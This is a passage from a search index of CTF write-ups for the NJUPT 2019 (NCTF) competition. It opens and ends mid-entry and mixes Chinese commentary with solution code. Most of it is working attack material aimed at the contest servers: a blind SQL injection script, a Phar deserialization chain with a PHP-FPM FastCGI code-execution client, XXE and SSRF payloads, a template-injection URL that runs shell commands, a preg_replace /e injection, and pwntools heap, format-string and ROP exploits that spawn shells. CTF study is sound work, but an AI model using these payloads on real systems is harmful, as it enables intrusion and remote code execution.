print(getshell())","title":"flask_website"},{"location":"writeup/NJUPT-2019/#sqli","text":"\u539f\u9898,\u4f7f\u7528REGEXP\u6b63\u5219 import requests url = \"http://nctf2019.x1ct34m.com:40005/index.php\" flag = \"\" k = 0 list = \"qwertyuiopasdfghjklzxcvbnm_0123456789\" while True: k+= 1 print k, for i in list: p = len(requests.post(url,data={ \"passwd\":\"\"\"||passwd/**/REGEXP/**/\"^\\\\{}\";\\x00\"\"\".format(flag+i), \"username\":'\\\\' }).text) if p == 48: # print chr(i) flag += i print flag break","title":"SQLi"},{"location":"writeup/NJUPT-2019/#easyphp","text":"\u5957\u5a03\u9898\uff0c\u6ca1\u5565\u8bf4\u7684 http://nctf2019.x1ct34m.com:60005/?num=23333%0a&str1=2120624&str2=240610708&q%20w%20q=c\\at%20*","title":"easyphp"},{"location":"writeup/NJUPT-2019/#phar-matches-everything","text":"\u6839\u636evim\u4ea4\u6362\u6587\u4ef6\u5f97\u5230\u6587\u4ef6\u6e90\u7801 \u7b2c\u4e8c\u6b65\u6839\u636e Phar \u6784\u9020\u53cd\u5e8f\u5217\u5316 \u4f7f\u7528curl\u5f97\u5230SSTI \u6700\u540e\u5185\u7f51\u626b\u63cf\u5f97\u5230\u4e00\u4e2ahint => fpm \u7136\u540e\u901a\u8fc7gopher\u534f\u8bae\u5f97\u5230 Phar+SSTI+FPM <?php class Easytest{ protected $test; public function __construct(){ $this->test = '1'; } public function funny_get(){ return $this->test; } } class Main { public $url; public function curl($url){ $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $output=curl_exec($ch); curl_close($ch); return $output; } public function __destruct(){ $this_is_a_easy_test=unserialize($_GET['careful']); if($this_is_a_easy_test->funny_get() === '1'){ echo $this->curl($this->url); } } } $a = new Easytest(); echo urlencode(serialize($a)); //O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D $m = new Main(); $url = $argv[1]; $m->url = \"\"; #!coding=utf8 import requests import re file = open('phar.phar') url1 = \"http://nctf2019.x1ct34m.com:40004/upload.php\" url2 = \"http://nctf2019.x1ct34m.com:40004/catchmime.php?careful=O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D\" def upload(): content = requests.post(url1,files={\"fileToUpload\":('1.gif',file)}).text print content return re.findall(r\"file (.*) has\",content)[0].strip() def req(filename): print requests.post(url2,data={ 'name':'phar:///var/www/html/uploads/{}/test.txt'.format(filename), 'submit':1 }).text name = upload() print name req(name) import socket import random import argparse import sys from io import BytesIO # Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client PY2 = True if sys.version_info.major == 2 else False def bchr(i): if PY2: return force_bytes(chr(i)) else: return bytes([i]) def bord(c): if isinstance(c, int): return c else: return ord(c) def force_bytes(s): if isinstance(s, bytes): return s else: return s.encode('utf-8', 'strict') def force_text(s): if issubclass(type(s), str): return s if isinstance(s, bytes): s = str(s, 'utf-8', 'strict') else: s = str(s) return s class FastCGIClient: \"\"\"A Fast-CGI Client for Python\"\"\" # private __FCGI_VERSION = 1 __FCGI_ROLE_RESPONDER = 1 __FCGI_ROLE_AUTHORIZER = 2 __FCGI_ROLE_FILTER = 3 __FCGI_TYPE_BEGIN = 1 __FCGI_TYPE_ABORT = 2 __FCGI_TYPE_END = 3 __FCGI_TYPE_PARAMS = 4 __FCGI_TYPE_STDIN = 5 __FCGI_TYPE_STDOUT = 6 __FCGI_TYPE_STDERR = 7 __FCGI_TYPE_DATA = 8 __FCGI_TYPE_GETVALUES = 9 __FCGI_TYPE_GETVALUES_RESULT = 10 __FCGI_TYPE_UNKOWNTYPE = 11 __FCGI_HEADER_SIZE = 8 # request state FCGI_STATE_SEND = 1 FCGI_STATE_ERROR = 2 FCGI_STATE_SUCCESS = 3 def __init__(self, host, port, timeout, keepalive): self.host = host self.port = port self.timeout = timeout if keepalive: self.keepalive = 1 else: self.keepalive = 0 self.sock = None self.requests = dict() def __connect(self): self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.settimeout(self.timeout) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try: self.sock.connect((self.host, int(self.port))) except socket.error as msg: self.sock.close() self.sock = None print(repr(msg)) return False return True def __encodeFastCGIRecord(self, fcgi_type, content, requestid): length = len(content) buf = bchr(FastCGIClient.__FCGI_VERSION) \\ + bchr(fcgi_type) \\ + bchr((requestid >> 8) & 0xFF) \\ + bchr(requestid & 0xFF) \\ + bchr((length >> 8) & 0xFF) \\ + bchr(length & 0xFF) \\ + bchr(0) \\ + bchr(0) \\ + content return buf def __encodeNameValueParams(self, name, value): nLen = len(name) vLen = len(value) record = b'' if nLen < 128: record += bchr(nLen) else: record += bchr((nLen >> 24) | 0x80) \\ + bchr((nLen >> 16) & 0xFF) \\ + bchr((nLen >> 8) & 0xFF) \\ + bchr(nLen & 0xFF) if vLen < 128: record += bchr(vLen) else: record += bchr((vLen >> 24) | 0x80) \\ + bchr((vLen >> 16) & 0xFF) \\ + bchr((vLen >> 8) & 0xFF) \\ + bchr(vLen & 0xFF) return record + name + value def __decodeFastCGIHeader(self, stream): header = dict() header['version'] = bord(stream[0]) header['type'] = bord(stream[1]) header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3]) header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5]) header['paddingLength'] = bord(stream[6]) header['reserved'] = bord(stream[7]) return header def __decodeFastCGIRecord(self, buffer): header = buffer.read(int(self.__FCGI_HEADER_SIZE)) if not header: return False else: record = self.__decodeFastCGIHeader(header) record['content'] = b'' if 'contentLength' in record.keys(): contentLength = int(record['contentLength']) record['content'] += buffer.read(contentLength) if 'paddingLength' in record.keys(): skiped = buffer.read(int(record['paddingLength'])) return record def request(self, nameValuePairs={}, post=''): if not self.__connect(): print('connect failure! please check your fasctcgi-server !!') return requestId = random.randint(1, (1 << 16) - 1) self.requests[requestId] = dict() request = b\"\" beginFCGIRecordContent = bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord = b'' if nameValuePairs: for (name, value) in nameValuePairs.items(): name = force_bytes(name) value = force_bytes(value) paramsRecord += self.__encodeNameValueParams(name, value) if paramsRecord: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId) if post: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId) self.sock.send(request) self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND self.requests[requestId]['response'] = b'' return self.__waitForResponse(requestId) def __waitForResponse(self, requestId): data = b'' while True: buf = self.sock.recv(512) if not len(buf): break data += buf data = BytesIO(data) while True: response = self.__decodeFastCGIRecord(data) if not response: break if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \\ or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR: if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR: self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR if requestId == int(response['requestId']): self.requests[requestId]['response'] += response['content'] if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS: self.requests[requestId] return self.requests[requestId]['response'] def __repr__(self): return \"fastcgi connect host:{} port:{}\".format(self.host, self.port) if __name__ == '__main__': parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.') parser.add_argument('host', help='Target host, such as 127.0.0.1') parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php') parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php phpinfo(); exit; ?>') parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int) args = parser.parse_args() client = FastCGIClient(args.host, args.port, 3, 0) params = dict() documentRoot = \"/\" uri = args.file content = args.code params = { 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'POST', 'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'), 'SCRIPT_NAME': uri, 'QUERY_STRING': '', 'REQUEST_URI': uri, 'DOCUMENT_ROOT': documentRoot, 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '9985', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': \"localhost\", 'SERVER_PROTOCOL': 'HTTP/1.1', 'CONTENT_TYPE': 'application/text', 'CONTENT_LENGTH': \"%d\" % len(content), 'PHP_VALUE': 'auto_prepend_file = php://input', 'PHP_ADMIN_VALUE': 'safe_mode=Off\\nopen_basedir=Off\\ndisable_functions=Off\\nallow_url_include = On' } response = client.request(params, content) print(force_text(response))","title":"phar matches everything(\u63a8\u8350\u597d\u597d\u7814\u7a76\u4e00\u4e0b)"},{"location":"writeup/NJUPT-2019/#fake-xml-cookbook","text":"F12\u770b\u4e86\u4e00\u773c\u53d1\u73b0 function doLogin(){ var username = $(\"#username\").val(); var password = $(\"#password\").val(); if(username == \"\" || password == \"\"){ alert(\"Please enter the username and password!\"); return; } var data = \"<user><username>\" + username + \"</username><password>\" + password + \"</password></user>\"; $.ajax({ type: \"POST\", url: \"doLogin.php\", contentType: \"application/xml;charset=utf-8\", data: data, dataType: \"xml\", anysc: false, success: function (result) { var code = result.getElementsByTagName(\"code\")[0].childNodes[0].nodeValue; var msg = result.getElementsByTagName(\"msg\")[0].childNodes[0].nodeValue; if(code == \"0\"){ $(\".msg\").text(msg + \" login fail!\"); }else if(code == \"1\"){ $(\".msg\").text(msg + \" login success!\"); }else{ $(\".msg\").text(\"error:\" + msg); } }, error: function (XMLHttpRequest,textStatus,errorThrown) { $(\".msg\").text(errorThrown + ':' + textStatus); } }); } \u7528XML\u548c\u670d\u52a1\u5668\u901a\u8baf\uff0c\u8054\u60f3\u5230XXE\u653b\u51fb burp\u6293post\u5305\u5f97\u5230 POST /doLogin.php HTTP/1.1 Host: nctf2019.x1ct34m.com:40002 Content-Length: 207 Accept: application/xml, text/xml, */*; q=0.01 Origin: http://nctf2019.x1ct34m.com:40002 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 DNT: 1 Content-Type: application/xml;charset=UTF-8 Referer: http://nctf2019.x1ct34m.com:40003/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close <user><username>admin</username><password>123</password></user> \u6839\u636ejs\u811a\u672c\u53ef\u4ee5\u53d1\u73b0username\u662f\u53ef\u4ee5\u56de\u663e\u7684 \u7136\u540e\u6784\u9020\u4e00\u4e0bexp POST /doLogin.php HTTP/1.1 Host: nctf2019.x1ct34m.com:40002 Content-Length: 207 Accept: application/xml, text/xml, */*; q=0.01 Origin: http://nctf2019.x1ct34m.com:40002 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 DNT: 1 Content-Type: application/xml;charset=UTF-8 Referer: http://nctf2019.x1ct34m.com:40003/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/flag\"> ]> <user><username>&xxe;</username><password>123</password></user>","title":"Fake XML cookbook"},{"location":"writeup/NJUPT-2019/#true-xml-cookbook","text":"XML+SSRF\u6253\u5185\u7f51 POST /doLogin.php HTTP/1.1 Host: nctf2019.x1ct34m.com:40003 Content-Length: 220 Accept: application/xml, text/xml, */*; q=0.01 Origin: http://nctf2019.x1ct34m.com:40003 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 DNT: 1 Content-Type: application/xml;charset=UTF-8 Referer: http://nctf2019.x1ct34m.com:40003/ Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close <?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=http://192.168.1.8\"> ]> <user><username>&xxe;</username><password>123</password></user> NCTF{XXE-labs_is_g00d}","title":"True XML cookbook"},{"location":"writeup/NJUPT-2019/#flask","text":"\u6a21\u677f\u6ce8\u5165,\u7528\u901a\u914d\u7b26\u8bfbflag http://nctf2019.x1ct34m.com:40007/%7B%7B''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('cat%20/fla?%27).read()%7D%7D","title":"flask"},{"location":"writeup/NJUPT-2019/#upload-your-shell","text":"\u4f20\u4e00\u4e2a\u56fe\u7247\u9a6c,\u4f1a\u8fd4\u56de\u4e00\u4e2a\u9898\u76ee\u672c\u8eab\u5c31\u51c6\u5907\u597d\u7684\u56fe\u7247\u9a6c\u7684\u6240\u5728\u76ee\u5f55 \u627e\u4e2a\u5730\u65b9\u5305\u542b\u4e00\u4e0b\u5c31\u597d\u4e86 http://nctf2019.x1ct34m.com:60002/index.php?action=/upload-imgs/9ae46c526dfb6d96e95ad35bfbb2b6c4/Th1s_is_a_fl4g.jpg","title":"Upload your Shell"},{"location":"writeup/NJUPT-2019/#replace","text":"\u586b\u4e09\u4e2a\"#\"\u62a5\u9519 Parse error: syntax error, unexpected end of file in /var/www/html/index.php(70) : regexp code on line 1 Fatal error: preg_replace(): Failed evaluating code: # in /var/www/html/index.php on line 70 \u5b9e\u73b0\u529f\u80fd\u4f7f\u7528\u7684\u662fpreg_replace() \u9898\u76ee\u63d0\u793a\u7528\u4e86php5.6 \u60f3\u5230preg_replace() /e\u53c2\u6570 \u8bd5\u4e00\u4e0b\u53ef\u4ee5\u6267\u884cphpinfo() POST /index.php HTTP/1.1 Host: nctf2019.x1ct34m.com:40006 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 72 Origin: http://nctf2019.x1ct34m.com:40006 Connection: close Referer: http://nctf2019.x1ct34m.com:40006/index.php Cookie: PHPSESSID=6vtpnnca8f9mjjde768sqiub4g Upgrade-Insecure-Requests: 1 sub=text&pat=e&rep=phpinfo(); \u4f46\u662f\u76f4\u63a5\u7528readfile('/flag')\u8bfb\u6587\u4ef6\uff0c\u53d1\u73b0\u5355\u5f15\u53f7\u88ab\u62e6\u622a \u4e8e\u662f\u7528chr()\u62fc\u63a5\u8868\u793a\u5b57\u7b26\u4e32\u3002\u3002\u3002\u3002\u3002 POST /index.php HTTP/1.1 Host: nctf2019.x1ct34m.com:40006 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 72 Origin: http://nctf2019.x1ct34m.com:40006 Connection: close Referer: http://nctf2019.x1ct34m.com:40006/index.php Cookie: PHPSESSID=6vtpnnca8f9mjjde768sqiub4g Upgrade-Insecure-Requests: 1 sub=text&pat=e&rep=readfile(chr(47).chr(102).chr(108).chr(97).chr(103));","title":"replace"},{"location":"writeup/NJUPT-2019/#pwn","text":"","title":"Pwn"},{"location":"writeup/NJUPT-2019/#hello_pwn","text":"\u8fde\u63a5nc\u540e\u53d1\u73b0\u8ba9\u6211\u7528pwntools \u6784\u9020exp \u83b7\u5f97flag","title":"hello_pwn"},{"location":"writeup/NJUPT-2019/#pwn_me_1","text":"\u57fa\u7840\u6808\u6ea2\u51fa from pwn import * a=remote(\"139.129.76.65\",\"50004\") ad=0x400861 payload='yes\\0'+'a'*12+p64(0x66666666) a.sendline(payload) a.interactive()","title":"pwn_me_1"},{"location":"writeup/NJUPT-2019/#pwn_me_2","text":"\u57fa\u7840\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 #coding:utf-8 from pwn import * path = './pwn_me_2' local = 0 attach = 0 #P = ELF(path) context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c']) context.log_level = 'debug' if local == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('139.129.76.65',50005) p.recvuntil('but your name:\\n') p.send('%p'*15) p.recvuntil('preparing......\\n') base = int(p.recv(14),16) - (0x55f5229a5080-0x000055f5227a3000) log.success('base = '+hex(base)) target = base+0x2020e0 p.recvuntil('what do you want?\\n') payload = '%'+str(0x66)+'c%10$hhn'+'%'+str(0x666666-0x66)+'c%11$lln....'+p64(target)+p64(target+1) p.send(payload) #NCTF{rrr_loves_pwn_and_100years} if attach == 1: gdb.attach(p) p.interactive()","title":"pwn_me_2"},{"location":"writeup/NJUPT-2019/#pwn_me_3","text":"\u57fa\u7840unlink #coding:utf-8 from pwn import * path = './pwn_me_3' local = 1 attach = 0 #P = ELF(path) context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c']) context.log_level = 'debug' if local == 0: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('139.129.76.65',50006) def add(size,content): p.recvuntil('5,exit\\n') p.sendline('1') p.recvuntil('size:\\n') p.sendline(str(size)) p.recvuntil('content:\\n') p.send(content) def delete(index): p.recvuntil('5,exit\\n') p.sendline('2') p.recvuntil('idx:\\n') p.sendline(str(index)) def show(index): p.recvuntil('5,exit\\n') p.sendline('3') p.recvuntil('idx\\n') p.sendline(str(index)) def edit(index,content): p.recvuntil('5,exit\\n') p.sendline('4') p.recvuntil('idx:\\n') p.sendline(str(index)) p.recvuntil('content:\\n') p.send(content) add(0x10,'\\x00'*0x10) #0 add(0x10,'\\x11'*0x10) #1 delete(0) delete(1) p.recvuntil('5,exit\\n') p.sendline('1') p.recvuntil('size:\\n') p.sendline('0') p.recvuntil('content:\\n') edit(0,'\\x50') show(0) heap_addr = u64(p.recvuntil('\\n',drop=True).ljust(8,'\\x00')) - 0x50 log.success('heap_addr = '+hex(heap_addr)) add(0x38,'\\x11'*0x30) #1 add(0xf0,'\\x22'*0xf0) #2 add(0x20,'\\x33'*0x20) #3 delete(1) payload = p64(0) + p64(0x31) + p64(0x6020e8-0x18) + p64(0x6020e8-0x10) + p64(0)*2 + p64(0x30) add(0x38,payload) delete(2) payload = p64(0)*2 + p64(heap_addr+0x10) edit(1,payload) edit(0,p64(0x66666666)) p.recvuntil('5,exit\\n') p.sendline('5') #NCTF{Ohh!h0pe_y0u_c4n_pwn_100years_too} if attach == 1: gdb.attach(p) p.interactive()","title":"pwn_me_3"},{"location":"writeup/NJUPT-2019/#warmup","text":"\u57fa\u7840rop #coding:utf-8 from pwn import * path = './warm_up' local = 1 attach = 0 P = ELF(path) context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c']) context.log_level = 'debug' if local == 0: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('139.129.76.65',50007) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') p.recvuntil('p!!!\\n') p.send('\\x11'*0x18+'\\x12') p.recvuntil('\\x12') canary = u64(p.recv(7)+'\\x00') log.success('canary = '+hex(canary)) p.recvuntil('?') payload = p64(0)*3 + '\\x00' + p64(canary)[:7] payload+= p64(0) payload+= p64(0x400ab6) p.send(payload) p.recvuntil('warm up!!!') p.send('\\x11'*0x2f+'\\x12') p.recvuntil('\\x12') libcbase = u64(p.recv(6).ljust(8,'\\x00')) - libc.sym['__libc_start_main'] - 240 log.success('libcbase = '+hex(libcbase)) p_rdx_rsi = 0x00000000001150c9 + libcbase p_rdi = 0x400bc3 p_rbp = 0x400970 leave = 0x400a49 flag_addr = 0x601a00 + 0x98 p.recvuntil('?') payload = p64(0)*3 + '\\x00' + p64(canary)[:7] payload+= p64(0) payload+= p64(p_rdi) + p64(0) payload+= p64(p_rdx_rsi) + p64(0x100) + p64(0x601a00) payload+= p64(libcbase+libc.sym['read']) payload+= p64(p_rbp) + p64(0x601a00) payload+= p64(leave) p.send(payload) raw_input() payload = p64(0x601a00) payload+= p64(p_rdi) + p64(flag_addr) payload+= p64(p_rdx_rsi) + p64(0) + p64(0) payload+= p64(libcbase+libc.sym['open']) payload+= p64(p_rdi) + p64(3) payload+= p64(p_rdx_rsi) + p64(0x100) + p64(0x601b00) payload+= p64(libcbase+libc.sym['read']) payload+= p64(p_rdi) + p64(1) payload+= p64(p_rdx_rsi) + p64(0x100) + p64(0x601b00) payload+= p64(libcbase+libc.sym['write']) payload+= './flag' p.send(payload) if attach == 1: gdb.attach(p) p.interactive()","title":"warmup"},{"location":"writeup/NJUPT-2019/#easy_rop","text":"\u57fa\u7840rop #coding:utf-8 from pwn import * path = './easy_rop' local = 1 attach = 0 P = ELF(path) context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c']) context.log_level = 'debug' if local == 0: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('139.129.76.65',50002) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') for i in range(26): p.recvuntil(': ') p.sendline(str(0)) p.recvuntil(': ') p.sendline('+') p.recvuntil(': ') p.sendline('+') p.recvuntil(': ') p.sendline('+') p.recvuntil('28 = ') base1 = int(p.recvuntil('\\n',drop=True),10) log.success('base1 = '+hex(base1)) p.recvuntil(': ') p.sendline('+') p.recvuntil('29 = ') base2 = int(p.recvuntil('\\n',drop=True),10) log.success('base2 = '+hex(base2)) base = str(hex(base2))+str(hex(base1))[2:] base = int(base,16) - (0x55e9d0e36b40-0x000055e9d0e36000) log.success('base = '+hex(base)) start = base + 0x8a0 start1 = str(hex(start))[2:6] start2 = str(hex(start))[6:] start1 = int(start1,16) start2 = int(start2,16) p.recvuntil(': ') p.sendline(str(start2)) p.recvuntil(': ') p.sendline(str(start1)) p.recvuntil(': ') p.sendline('+') p.recvuntil(': ') p.sendline('+') p.recvuntil('your name?\\n') p.send('\\x00') #====================================== for i in range(26): p.recvuntil(': ') p.sendline(str(0)) p.recvuntil(': ') p.sendline('+') p.recvuntil(': ') p.sendline('+') target = base + 0x201420 target1 = str(hex(target))[2:6] target2 = str(hex(target))[6:] target1 = int(target1,16) target2 = int(target2,16) p.recvuntil(': ') p.sendline(str(target2)) p.recvuntil(': ') p.sendline(str(target1)) leave = base + 0xb31 leave1 = str(hex(leave))[2:6] leave2 = str(hex(leave))[6:] leave1 = int(leave1,16) leave2 = int(leave2,16) p.recvuntil(': ') p.sendline(str(leave2)) p.recvuntil(': ') p.sendline(str(leave1)) p.recvuntil(': ') p.sendline('+') p.recvuntil(': ') p.sendline('+') part1 = base + 0xb96 part2 = base + 0xb80 def call_fun(fun_addr,arg1,arg2,arg3): payload = p64(part1) payload+= p64(0) payload+= p64(0) payload+= p64(1) payload+= p64(fun_addr) payload+= p64(arg1) payload+= p64(arg2) payload+= p64(arg3) payload+= p64(part2) payload+= 'a'*0x38 return payload p_rdi = base + 0xba3 p_rbp = base + 0x900 p.recvuntil('your name?\\n') payload = p64(target) payload+= p64(p_rdi) payload+= p64(P.got['puts']+base) payload+= p64(P.plt['puts']+base) payload+= call_fun(P.got['read']+base,0x100,base+0x201500,0) payload+= p64(p_rbp) payload+= p64(base+0x201500) payload+= p64(leave) p.send(payload) libcbase = u64(p.recv(6).ljust(8,'\\x00')) - libc.sym['puts'] log.success('libcbase = '+hex(libcbase)) payload = p64(base+0x201500) payload+= p64(p_rdi) payload+= p64(libcbase+libc.search('/bin/sh\\x00').next()) payload+= p64(libcbase+libc.sym['system']) p.send(payload) #NCTF{rop_1s_b4st!!!!} if attach == 1: gdb.attach(p) p.interactive()","title":"easy_rop"},{"location":"writeup/NJUPT-2019/#easy_heap","text":"\u4e24\u6b21fb_atk #coding:utf-8 from pwn import * path = './easy_heap' local = 1 attach = 0 #P = ELF(path) context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c']) context.log_level = 'debug' if local == 0: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('139.129.76.65',50001) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') def new(size,content): p.recvuntil('4. exit\\n') p.sendline('1') p.recvuntil('size?\\n') p.sendline(str(size)) p.recvuntil('ontent?\\n') p.send(content) def delete(index): p.recvuntil('4. exit\\n') p.sendline('2') p.recvuntil('index?\\n') p.sendline(str(index)) def show(index): p.recvuntil('4. exit\\n') p.sendline('3') p.recvuntil('index?\\n') p.sendline(str(index)) p.recvuntil('your name?\\n') p.send(p64(0)+p64(0x60)) new(0x50,'\\x00'*0x50) #0 new(0x50,'\\x11'*0x50) #1 delete(0) delete(1) delete(0) new(0x50,p64(0x602060)) new(0x50,'\\x33'*0x50) new(0x50,'\\x44'*0x50) payload = p64(0) + p64(0x1000) + p64(0)*8 new(0x50,payload) new(0x80,'\\x00') #0 new(0x60,'\\x11'*0x60) #1 delete(0) show(0) p.recvuntil('0: ') libcbase = u64(p.recv(6).ljust(8,'\\x00')) - (0x7f54cfedab78-0x00007f54cfb16000) log.success('libcbase = '+hex(libcbase)) new(0x60,'\\x22'*0x60) delete(1) delete(2) delete(1) new(0x60,p64(libcbase+libc.sym['__malloc_hook']-0x23)) new(0x60,'\\x00') new(0x60,'\\x00') one_gadget = [0x4526a,0x45216,0xf02a4,0xf1147] payload = '\\x00'*0x13 + p64(libcbase+one_gadget[2]) new(0x60,payload) delete(6) if attach == 1: gdb.attach(p) p.interactive()","title":"easy_heap"},{"location":"writeup/NJUPT-2019/#re","text":"","title":"Re"},{"location":"writeup/NJUPT-2019/#_1","text":"IDA\u6253\u5f00 \u8fdb\u5230 sub_401340 \u4e2d \u5c31\u662f\u6709\u4e00\u4e2a7*7\u7684\u77e9\u9635\u548c\u6211\u4eec\u8f93\u5165\u768449\u4f4d\u5b57\u7b26\u7684ASCII\u7801\u6309\u5217\u6392\u5e03\u6784\u6210\u7684\u77e9\u9635(\u7b2c\u4e00\u5217\u662fa[0]~a[6])\u76f8\u4e58\u4f1a\u5f97\u5230dword_404000 \u9664\u4e86 dword_404000[0]=4884h \u5916\u90fd\u662f4\u884c\u4ee3\u8868\u4e00\u4e2a\u5143\u7d20,\u5373 dword_404000[1]=91C4h dword_404000[2]=7D35h dword_404000[3]=81FEh ... \u7136\u540e\u5c31\u662f\u6c42\u89e3\u975e\u9f50\u6b21\u7ebf\u6027\u65b9\u7a0b\u7ec4\u4e86 $$ \\left{ \\begin{matrix} 12 & 53 & 6 & 34 & 58 & 36 & 1 \\ 83 & 85 & 12 & 73 & 27 & 96 & 52 \\ 78 & 53 & 24 & 36 & 86 & 25 & 46 \\ 39 & 78 & 52 & 9 & 62 & 37 & 84 \\ 23 & 6 & 14 & 74 & 48 & 12 & 83 \\ 27 & 85 & 92 & 42 & 48 & 15 & 72 \\ 4 & 6 & 3 & 67 & 0 & 26 & 68 \\end{matrix} \\right} \\tag{1} $$ $$ \\left{ \\begin{matrix} a1[0] & a1[7] & a1[14] & a1[21] & a1[28] & a1[35] & a1[42] \\ a1[1] & a1[8] & a1[15] & a1[22] & a1[29] & a1[36] & a1[43] \\ a1[2] & a1[9] & a1[16] & a1[23] & a1[30] & a1[37] & a1[44] \\ a1[3] & a1[10] & a1[17] & a1[24] & a1[31] & a1[38] & a1[45] \\ a1[4] & a1[11] & a1[18] & a1[25] & a1[32] & a1[39] & a1[46] \\ a1[5] & a1[12] & a1[19] & a1[26] & a1[33] & a1[40] & a1[47] \\ a1[6] & a1[13] & a1[20] & a1[27] & a1[34] & a1[41] & a1[48] \\end{matrix} \\right} \\tag{2} $$ $$ \\left{ \\begin{matrix} d[0] & d[7] & d[14] & d[21] & d[28] & d[35] & d[42] \\ d[1] & d[8] & d[15] & d[22] & d[29] & d[36] & d[43] \\ d[2] & d[9] & d[16] & d[23] & d[30] & d[37] & d[44] \\ d[3] & d[10] & d[17] & d[24] & d[31] & d[38] & d[45] \\ d[4] & d[11] & d[18] & d[25] & d[32] & d[39] & d[46] \\ d[5] & d[12] & d[19] & 